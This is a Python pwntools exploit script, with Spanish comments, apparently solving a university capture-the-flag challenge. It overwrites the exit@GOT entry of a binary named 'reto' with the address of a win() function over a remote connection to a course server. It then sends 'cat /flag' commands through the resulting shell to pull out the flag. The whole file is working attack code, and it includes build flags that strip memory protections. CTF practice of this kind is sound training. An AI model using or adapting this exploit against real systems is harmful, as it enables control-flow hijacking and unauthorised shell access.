#!/usr/bin/env python3
# Game Of Thrones - GOT Overwrite exploit

from pwn import *
import os

def exploit():
    # Cargar el binario local para obtener direcciones
    print("[*] Cargando binario local...")
    try:
        # Buscar el binario en la carpeta del script
        script_dir = os.path.dirname(os.path.abspath(__file__))
        reto_path = os.path.join(script_dir, "reto")
        elf = ELF(reto_path)
        
        win_addr = elf.symbols['win']
        exit_got = elf.got['exit']
        
        log.info(f"win()     = {hex(win_addr)}")
        log.info(f"exit@GOT  = {hex(exit_got)}")
        
    except FileNotFoundError:
        print("[-] Binario 'reto' no encontrado en la carpeta actual")
        print("[*] Asegúrate de estar en ctf_argentina/")
        print("[*] O intenta compilarlo con:")
        print("    gcc reto.c -w -O0 -std=c99 -fno-pie -fno-pic \\")
        print("        -fno-stack-protector -z norelro -o reto")
        return
    except Exception as e:
        print(f"[-] Error cargando binario: {e}")
        import traceback
        traceback.print_exc()
        return
    
    # Conectar al servidor remoto
    print("\n[*] Conectando a ic.catedras.linti.unlp.edu.ar:15022...")
    p = remote("ic.catedras.linti.unlp.edu.ar", 15022)
    
    # Recibir primer prompt
    p.recvuntil(b"direccion")
    print("[+] Servidor pidiendo dirección")
    
    # Enviar dirección de exit@GOT
    print(f"[*] Enviando address = {hex(exit_got)}")
    p.sendline(hex(exit_got)[2:].encode())
    
    # Recibir segundo prompt
    p.recvuntil(b"bytes")
    print("[+] Servidor pidiendo valor")
    
    # Enviar dirección de win()
    print(f"[*] Enviando value = {hex(win_addr)}")
    p.sendline(hex(win_addr)[2:].encode())
    
    # El programa ahora hace:
    # *(unsigned int *)exit_got = win_addr;
    # puts("bye...\n");
    # exit(1);  <- Esto ahora salta a win() en lugar de exit real
    
    print("\n[+] Exploit enviado. Sobrescrita GOT(exit) -> win()")
    print("[*] Obteniendo shell remoto...")
    
    # Dar un momento para que se estabilice la conexión
    import time
    time.sleep(1)
    
    # Intentar obtener la flag automáticamente
    try:
        print("[*] Buscando flag...")
        
        # Intentar diferentes rutas/nombres de flag
        flag_commands = [
            b"cat /flag\n",
            b"cat flag\n",
        ]
        
        flag_found = False
        for cmd in flag_commands:
            try:
                p.sendline(cmd)
                p.settimeout(3)
                # Recibir toda la salida disponible
                output = b""
                while True:
                    try:
                        chunk = p.recv(1024, timeout=0.5)
                        if not chunk:
                            break
                        output += chunk
                    except:
                        break
                
                if b"IC{" in output or b"UNLP{" in output:
                    # Extraer solo la línea con la flag
                    lines = output.decode(errors='replace').split('\n')
                    for line in lines:
                        if "IC{" in line or "UNLP{" in line:
                            print(f"\n[+] FLAG ENCONTRADA:\n{line.strip()}\n")
                            flag_found = True
                            break
                    if flag_found:
                        break
            except Exception as e:
                pass
        
        if not flag_found:
            print("[-] No se encontró la flag en las ubicaciones comunes")
        
        p.close()
        
    except Exception as e:
        print(f"[-] Error: {e}")
        p.close()

if __name__ == "__main__":
    exploit()
